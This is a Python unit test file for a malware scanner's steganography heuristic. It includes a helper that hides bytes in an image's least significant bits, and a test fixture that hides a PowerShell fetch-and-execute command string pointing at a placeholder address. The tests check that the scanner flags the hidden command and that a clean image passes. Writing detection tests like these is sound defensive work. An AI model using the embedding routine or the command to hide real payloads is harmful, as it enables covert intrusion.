import contextlib
import io
import sys
import tempfile
import unittest
from pathlib import Path

import numpy as np
from PIL import Image

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from malware_scanner import MalwareScanner


def embed_lsb_payload(payload_bytes, size=(128, 128)):
    """Embed payload bytes into the first LSB stream of an RGB image."""
    image = np.zeros((size[1], size[0], 3), dtype=np.uint8) + 120
    flat = image.reshape(-1)
    bits = np.unpackbits(np.frombuffer(payload_bytes, dtype=np.uint8), bitorder='big')
    if bits.size > flat.size:
        raise ValueError("Payload is too large for the requested image size")
    flat[:bits.size] = (flat[:bits.size] & 0xFE) | bits
    return image


class StegoHeuristicTests(unittest.TestCase):
    def setUp(self):
        self.scanner = MalwareScanner()

    def scan_path(self, path):
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            return self.scanner.scan_file(str(path))

    def test_hidden_powershell_payload_in_lsb_stream_is_detected(self):
        payload = (
            b"powershell -nop -w hidden "
            b"https://198.51.100.12/payload "
            b"Invoke-Expression"
        )

        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
            path = Path(tmp.name)

        try:
            image = Image.fromarray(embed_lsb_payload(payload), mode="RGB")
            image.save(path)
            result = self.scan_path(path)
        finally:
            path.unlink(missing_ok=True)

        finding_types = {finding["type"] for finding in result["findings"]}
        self.assertIn("LSB_PAYLOAD_SIGNATURE", finding_types)
        self.assertGreater(result["risk_score"], 0)
        self.assertGreater(result["stego_features"]["lsb_longest_printable_run"], 24)

    def test_clean_rgb_image_does_not_trigger_lsb_payload_signature(self):
        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
            path = Path(tmp.name)

        try:
            image = Image.new("RGB", (96, 96), color=(120, 120, 120))
            image.save(path)
            result = self.scan_path(path)
        finally:
            path.unlink(missing_ok=True)

        finding_types = {finding["type"] for finding in result["findings"]}
        self.assertNotIn("LSB_PAYLOAD_SIGNATURE", finding_types)


if __name__ == "__main__":
    unittest.main()
